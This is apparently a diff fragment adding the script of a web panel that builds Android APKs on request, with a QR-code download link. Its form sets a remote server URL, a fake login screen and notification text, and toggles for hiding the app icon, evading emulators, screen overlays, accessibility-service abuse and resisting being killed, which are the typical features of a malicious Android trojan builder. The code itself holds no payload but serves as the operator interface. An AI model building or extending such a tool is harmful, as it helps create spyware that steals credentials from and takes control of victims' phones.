+    function log(msg) {
+      var t = new Date().toLocaleTimeString();
+      buildLog.textContent += '[' + t + '] ' + msg + '\n';
+      buildLog.scrollTop = buildLog.scrollHeight;
+    }
+    function setProgress(pct) { progressFill.style.width = pct + '%'; }
+
+    
+    function randomPackage() {
+      var adj = ['cool','fast','nova','panda','happy','smart','lucky','neon','peak','core','vibe','zoom','epic','flux','apex','echo','iris','lark','moon'];
+      var noun = ['app','lab','hub','kit','box','sync','link','flow','nest','port','pro','max','go','plus','one','me'];
+      var pkg = 'com.' + adj[Math.floor(Math.random()*adj.length)] + '.' + noun[Math.floor(Math.random()*noun.length)];
+      document.getElementById('packageName').value = pkg;
+    }
+    function randomVersion() {
+      var maj = Math.floor(Math.random() * 4) + 1;
+      var min = Math.floor(Math.random() * 20);
+      var pat = Math.floor(Math.random() * 10);
+      document.getElementById('versionName').value = maj + '.' + min + '.' + pat;
+    }function collectForm() {
+      return {
+        app_name: document.getElementById('appName').value.trim(),
+        package_name: document.getElementById('packageName').value.trim(),
+        version_name: document.getElementById('versionName').value.trim() || '1.0.0',
+        server_url: document.getElementById('serverUrl').value.trim(),
+        icon_url: document.getElementById('iconUrl').value.trim(),
+        description: document.getElementById('appDescription').value.trim(),
+        build_region: document.getElementById('buildRegion').value,
+        login_title: document.getElementById('loginTitle').value.trim(),
+        login_desc: document.getElementById('loginDesc').value.trim(),
+        login_btn: document.getElementById('loginBtn').value.trim() || '登录',
+        notify_title: document.getElementById('notifyTitle').value.trim(),
+        notify_msg: document.getElementById('notifyMsg').value.trim() || '您有一条新消息',
+        hidden_app: document.getElementById('hiddenApp').checked ? 1 : 0,
+        no_emulator: document.getElementById('noEmulator').checked ? 1 : 0,
+        use_draw: document.getElementById('useDraw').checked ? 1 : 0,
+        use_access: document.getElementById('useAccess').checked ? 1 : 0,
+        use_antikill: document.getElementById('useAntikill').checked ? 1 : 0
+      };
+    }
+
+    btnBuild.addEventListener('click', async function() {
+      var data = collectForm();
+      if (!data.app_name || !data.package_name || !data.server_url) {
+        alert('请填写应用名称、包名和服务器地址');
+        return;
+      }
+      progressCard.style.display = 'block';
+      buildResult.classList.remove('show');
+      resultArea.innerHTML = '';
+      buildLog.textContent = '';
+      this.disabled = true;
+      log('开始构建 APK...');
+      setProgress(10);
+      try {
+        var token = localStorage.getItem('auth_token') || sessionStorage.getItem('auth_token') || 'demo-token-local';
+        var resp = await fetch('/api/build-apk', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
+          body: JSON.stringify(data)
+        });
+        setProgress(60);
+        log('服务器响应接收中...');
+        var result = await resp.json();
+        setProgress(90);
+        if (result.success) {
+          setProgress(100);
+          log('APK 构建成功！');
+          var msg = result.data?.message || '构建成功';
+          var dl = result.data?.download_url || result.data?.url || '';
+          resultArea.innerHTML = '<div class="success-banner">' +
+            '<p>APK 构建完成</p>' +
+            '<p style="margin-top:4px;font-size:12px;color:#8b949e">' + msg + '</p>' +
+            (dl ? '<p style="margin-top:4px"><a href="' + dl + '"> 下载 APK</a></p>' : '') +
+          '</div>';
+          if (dl) {
+            buildResult.classList.add('show');
+            document.getElementById('qrCodeImg').src = 'https://api.qrserver.com/v1/create-qr-code/?size=320x320&data=' + encodeURIComponent(dl);
+            document.getElementById('downloadBtn').href = dl;
+            document.getElementById('downloadUrlText').textContent = dl;
+          }
+          // 构建完成后刷新统计
+          setTimeout(loadStats, 1500);
+        } else {
+          log('构建失败: ' + (result.error || result.message || '未知错误'));
+          setProgress(100);
+          resultArea.innerHTML = '<div class="error-banner">构建失败: ' + (result.error || result.message || '未知错误') + '</div>';
+        }
+      } catch (err) {
+        log('请求异常: ' + err.message);
+        setProgress(100);
+        resultArea.innerHTML = '<div class="error-banner">请求异常: ' + err.message + '</div>';
+      } finally {
+        btnBuild.disabled = false;
+      }
+    });
+
+    btnReset.addEventListener('click', function() {
+      progressCard.style.display = 'none';
+      buildLog.textContent = '';
+      resultArea.innerHTML = '';
+      buildResult.classList.remove('show');
+      setProgress(0);
+    });
+
+    // ── 初始化 ──
+    updatePreview();
+    loadStats();
+  </script>
+</body>
+</html>
